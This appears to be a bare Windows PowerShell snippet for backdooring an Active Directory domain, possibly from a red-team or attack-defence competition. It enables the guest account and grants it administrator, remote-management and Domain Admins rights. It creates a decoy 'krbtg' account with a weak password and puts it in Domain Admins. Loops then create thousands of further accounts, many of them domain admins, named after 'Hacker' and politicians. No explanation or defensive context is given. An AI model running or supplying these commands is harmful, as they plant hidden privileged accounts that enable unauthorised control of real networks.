net user guest /active:yes
net localgroup "Administrators" guest /add /y
NET LOCALGROUP "Remote Management Users" guest /ADD

net user /add krbtg Password1! /domain
net group "Domain Admins" krbtg /ADD /DOMAIN
NET LOCALGROUP "Remote Management Users" krbtg /ADD

net group "Domain Admins" guest /ADD

# For Older Powershell
net user guest /active:yes
net localgroup "Administrators" guest /add /y
NET LOCALGROUP "Remote Management Users" guest /ADD

net user /add krbtg Password1! /domain
net group "Domain Admins" krbtg /ADD /DOMAIN
NET LOCALGROUP "Remote Management Users" krbtg /ADD

net group "Domain Admins" guest /ADD
# For Older Powershell
for ($i = 0; $i -lt 1000; $i++) {
  net user  "bob$i" Password1! /ADD 
  net group "Domain Admins" "bob$i" /ADD /DOMAIN
}

for ($i = 0; $i -lt 1000; $i++) {
  net user  "Donald Trump$i" Password1! /ADD 
  net group "Domain Admins" "Donald Trump$i" /ADD /DOMAIN
}

for ($i = 0; $i -lt 1000; $i++) {
  net user  "Hacker$i" Password1! /ADD 
}

for ($i = 0; $i -lt 1000; $i++) {
  net user  "Ron Desantis$i" Password1! /ADD 
}

for ($i = 0; $i -lt 1000; $i++) {
  net user  "moleary$i" Password1! /ADD 
  net group "Domain Admins" "bob$i" /ADD /DOMAIN
}
